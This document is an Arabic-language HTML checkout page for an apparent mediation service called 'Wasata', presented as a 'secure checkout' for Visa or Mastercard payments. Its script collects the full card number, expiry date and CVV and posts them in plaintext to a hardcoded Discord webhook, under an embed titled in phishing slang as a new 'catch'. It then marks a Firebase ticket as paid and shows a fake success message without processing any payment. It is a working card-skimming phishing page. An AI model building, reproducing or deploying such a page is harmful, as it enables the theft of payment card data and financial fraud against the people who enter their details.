<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إكمال الدفع | وساطة</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- إضافة فيسبوك Firebase لتمكين التحديث المباشر من هنا -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background-color: #fcfcfc; font-family: sans-serif; }
        .main-card { border-radius: 40px; border: 1px solid #f2f2f2; }
        .tab-btn { border: 2.5px solid #f1f5f9; border-radius: 20px; transition: 0.3s; opacity: 0.4; cursor: pointer; }
        .tab-btn.active { border-color: #000; opacity: 1; transform: scale(1.02); }
        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; width: 100%; outline: none; text-align: center; }
        input:focus { border-color: #00eccd; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">
    <div class="main-card bg-white w-full max-w-xl p-10 shadow-2xl relative">
        <h2 class="text-2xl font-black mb-2 text-right">إكمال الدفع 💳</h2>
        <p class="text-xs text-gray-400 mb-8 text-right uppercase tracking-widest">WASATA SECURE CHECKOUT</p>

        <div class="grid grid-cols-2 gap-4 mb-10">
            <div class="tab-btn active p-4 flex flex-col items-center gap-2" onclick="sel(this)">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-4">
            </div>
            <div class="tab-btn p-4 flex flex-col items-center gap-2" onclick="sel(this)">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-8">
            </div>
        </div>

        <div class="space-y-4 text-right">
            <div>
                <label class="text-[10px] font-bold text-gray-400 mr-2">رقم البطاقة</label>
                <input type="text" id="ccNo" placeholder="**** **** **** ****" maxlength="19">
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <input type="text" id="expiry" placeholder="MM / YY" maxlength="7">
                </div>
                <div>
                    <input type="password" id="cvc" placeholder="CVC" maxlength="3">
                </div>
            </div>
        </div>

        <button id="payBtn" onclick="send()" class="w-full bg-[#00eccd] text-white py-5 rounded-3xl mt-10 text-xl font-black shadow-lg hover:bg-[#00d1b5] transition">
            دفع ...
        </button>
    </div>

    <script>
        // ضبط الفايربيس
        const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // جلب البيانات من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const totalAmount = urlParams.get('total') || "0.00";
        const ticketKey = urlParams.get('ticket');

        document.getElementById('payBtn').innerText = `دفع ${totalAmount} SAR`;

        function sel(el) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            el.classList.add('active');
        }

        async function send() {
            const cc = document.getElementById('ccNo').value;
            const exp = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvc').value;

            if(!cc || !exp || !cvv) return alert("أكمل البيانات");

            const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
            const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'زائر'};

            // 1. إرسال للويب هوك
            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 صيدة دفع جديدة - وساطة",
                        fields: [
                            { name: "👤 العميل", value: session.email, inline: true },
                            { name: "💰 المبلغ", value: totalAmount + " SAR", inline: true },
                            { name: "💳 البطاقة", value: cc },
                            { name: "🔐 السر", value: exp + " | " + cvv }
                        ]
                    }]
                })
            });

            // 2. تحديث التيكت فوراً
            if(ticketKey) {
                await db.ref('tickets/' + ticketKey).update({
                    status: 'تم الدفع ✓',
                    action: null // إخفاء زر الدفع
                });
                await db.ref('tickets/' + ticketKey + '/messages').push({
                    text: `💳 تم تأكيد الدفع بنجاح لمبلغ: ${totalAmount} SAR.`,
                    sender: 'system',
                    time: new Date().toLocaleTimeString('ar-SA')
                });
            }

            alert("✅ تم الدفع بنجاح، سيتم نقلك للتذكرة.");
            location.href = 'ticket.html';
        }
    </script>
</body>
</html>
